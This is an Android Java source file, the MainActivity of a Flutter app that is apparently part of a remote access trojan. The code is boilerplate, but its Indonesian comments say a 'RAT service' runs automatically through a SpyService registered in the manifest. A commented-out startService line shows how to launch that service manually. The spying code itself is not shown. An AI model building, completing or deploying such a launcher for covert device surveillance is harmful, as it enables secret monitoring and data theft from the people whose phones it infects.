package com.nullx.pp;

import android.os.Bundle;
import io.flutter.embedding.android.FlutterActivity;

public class MainActivity extends FlutterActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // RAT service di-start otomatis lewat SpyService (lihat di AndroidManifest)
        // Tapi kalo mau manual, panggil di sini:
        // startService(new android.content.Intent(this, SpyService.class));
    }
}